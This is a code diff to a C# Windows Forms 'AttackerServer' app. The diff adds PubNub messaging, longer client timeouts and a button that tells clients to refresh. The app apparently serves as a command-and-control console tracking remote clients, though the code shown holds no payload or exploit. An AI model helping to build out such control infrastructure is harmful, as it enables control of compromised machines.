@@ -1,6 +1,7 @@
 ﻿using AtackerDTO;
 using AttackerCommon;
 using ChannelController;
+using PubnubApi;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -16,22 +17,24 @@ namespace AttackerServer
     public partial class Form1 : Form
     {
         const int ScreenReloadInterval = 1000;
-        const int MaxRespondingSeconds = 5;
-        const int MaxRemovingSeconds = 10;
+        const int MaxRespondingSeconds = 10;
+        const int MaxRemovingSeconds = 25;
 
         string SenderId;
         List<ClientData> Clients;
+        Pubnub pubnub;
 
         public Form1()
         {
             SenderId = Identity.CreateNewID();
             Clients = new List<ClientData>();
+            pubnub = ChannelHelper.InitializePubNubClient();
             InitializeComponent();
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            Listener listener = new Listener();
+            Listener listener = new Listener(pubnub);
             listener.AddListener((message) =>
             {
                 ReceiveMessage(message);
@@ -170,6 +173,32 @@ namespace AttackerServer
                 client.LastUpdate = DateTime.Now;
             }
 
+        }
+
+        private void PublishMessage(MessageType messageType, string data, Func<bool> afterSuccessFunction)
+        {
+            Publisher publisher = new Publisher(pubnub);
+            publisher.PublishMessage(new MessageDTO(messageType, SenderId, data), (isError, errorMessage) =>
+            {
+                if (isError)
+                {
+                    MessageBox.Show(errorMessage);
+                }
+                else
+                {
+                    afterSuccessFunction();
+                }
+                return !isError;
+            });
+        }
+
+        private void BtnRefreshClients_Click(object sender, EventArgs e)
+        {
+            PublishMessage(MessageType.RefreshClients, String.Empty, () =>
+            {
+                MessageBox.Show("Refreshed!");
+                return true;
+            });
         }
     }
 }
